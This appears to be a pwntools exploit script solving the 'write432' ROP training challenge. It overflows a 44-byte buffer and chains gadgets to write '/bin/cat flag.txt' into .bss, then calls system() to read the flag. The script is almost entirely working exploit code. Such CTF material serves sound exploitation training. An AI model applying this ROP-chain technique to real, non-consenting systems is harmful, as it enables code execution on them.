from pwn import *

# [26] .bss              NOBITS          0804a040 001030 00002c 00  WA  0   0 32
# bss is possible to R/W with 44 bytes of size

e = ELF('./write432')

plt_system = p32(e.symbols['system'])

bss_seg = 0x0804a040

'''
We have a good gadget in binary which writes string content present in ebp into the address pointed by edi


gef>  disas 0x08048670
Dump of assembler code for function usefulGadgets:
   0x08048670 <+0>:	mov    DWORD PTR [edi],ebp


0x080486da: pop edi; pop ebp; ret;


Plan is to keep stack with 1st address as <where to write> and second as <what to write>

Size of ebp is 32 bits/ 4 bytes, so we can only pass 4 bytes there. Hence, we divide our goal string
'''


gadget = p32(0x080486da)
useful = 0x08048670

# Fill buffer
payload = 'A'*44

# Write-Where
payload += gadget
payload += p32(bss_seg)
payload += p32(0x6e69622f)
payload += p32(useful)

payload += gadget
payload += p32(bss_seg+0x4)
payload += p32(0x7461632f)
payload += p32(useful)


payload += gadget
payload += p32(bss_seg+0x8)
payload += p32(0x616c6620)
payload += p32(useful)

payload += gadget
payload += p32(bss_seg+0xc)
payload += p32(0x78742e67)
payload += p32(useful)

payload += gadget
payload += p32(bss_seg+0x10)
payload += p32(0x00000074)
payload += p32(useful)

# Get flag
# 0xffffcec4â”‚+0x0004: 0x0804a040  ->  "/bin/cat flag.txt"
# load system, then pop the content present at .bss into edi registers 

payload += plt_system
payload += gadget
payload += p32(bss_seg)

with open('payload', 'wb') as f:
	f.write(payload)
	f.close()
